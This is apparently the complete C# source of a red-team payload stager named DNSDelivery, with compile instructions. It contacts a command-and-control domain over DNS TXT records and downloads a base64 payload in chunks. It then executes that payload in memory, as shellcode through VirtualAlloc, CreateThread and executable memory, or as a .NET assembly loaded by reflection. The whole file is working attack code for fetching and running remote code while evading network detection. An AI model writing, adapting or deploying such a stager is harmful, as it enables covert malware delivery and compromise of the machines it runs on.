/*
Author: Arno0x0x, Twitter: @Arno0x0x

How to compile:
===============
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:dnsdelivery.exe *.cs

Or, with debug information:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /define:DEBUG /out:dnsdelivery.exe *.cs

*/
using System;
using System.Text;
using System.Reflection;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace DNSDelivery
{
    // Dumb static class to hold all program main parameters
    internal static class PARAM
    {
        public const string DomainName = "YOUR_DOMAIN_NAME_HERE";
        public static readonly string ServerName = null; // This must be set to 'null' to use the default system's DNS servers
    }

    internal class Program
    {
        // Get data from the DNS server
        private static string GetData(string request)
        {
            StringBuilder response = new StringBuilder();
#if (DEBUG)
            Console.WriteLine("Sending request: {0}", request + "." + PARAM.DomainName);
#endif
            try
            {
                // Loop through each available records and merge them into one string
                foreach (string txtRecord in DnsResolver.GetTxtRecords(request + "." + PARAM.DomainName, PARAM.ServerName))
                {
                    response.Append(txtRecord);
                }
            }
            catch
            {
                return null;
            }

            return response.ToString();
        }

        public static void Main()
        {
            // Initialization step 
            // Contact the C2 over DNS channel, and ask what will be delivered:
            // - type of payload: can be a shellcode or a .Net assembly
            // - the number of chunks that constitute the payload

            // Contact the DNS C2 and perform initial request which is basically: "what do you have for me?"
            string init = GetData("init");
            if (init == null) return; // Error performing DNS request

            // The received string is base64 encoded, let's decode it
            string[] result = Encoding.ASCII.GetString(Convert.FromBase64String(init)).Split('|');
            string type = result[0];

            if (!int.TryParse(result[1], out int nbChunk)) return;
#if (DEBUG)
            Console.WriteLine("Type: {0}\nNb of chunks: {1}", type, nbChunk);
#endif

            // At this stage we know how much chunks of data should be downloaded
            // Let's download all chunks of data and merge them
            StringBuilder encodedPayload = new StringBuilder();
            int i = 0;

            while (i < nbChunk)
            {
                string request = $"{i}";
                string tmp = GetData(request);
                if (tmp == null) continue;
                Console.WriteLine("Received chunk #{0}", i);
                encodedPayload.Append(tmp);
                i++;
            }
#if (DEBUG)
            Console.WriteLine("Whole data received: \n[{0}]", encodedPayload);
#endif
            // Convert base64 data received back to byte array
            byte[] data = Convert.FromBase64String(encodedPayload.ToString());

            switch (type)
            {
                // The data received is a shellcode
                case "shellcode":
                    {
                        // Copy decrypted shellcode to memory and execute it
                        uint funcAddress = VirtualAlloc(0, (uint)data.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        Marshal.Copy(data, 0, (IntPtr)funcAddress, data.Length);
                        uint threadId = 0;

                        // Prepare data
                        IntPtr pInfo = IntPtr.Zero;

                        // Execute native code
                        IntPtr hThread = CreateThread(0, 0, funcAddress, pInfo, 0, ref threadId);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);

                        return;
                    }

                // The data received is a .Net assembly
                case "assembly":
                    {
                        Assembly a = Assembly.Load(data);
                        MethodInfo method = a.EntryPoint;
                        object o = a.CreateInstance(method.Name);
                        method.Invoke(o, null);

                        break;
                    }
            }
        }

        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern uint VirtualAlloc(
            uint lpStartAddress,
            uint size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            uint lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);
    }
}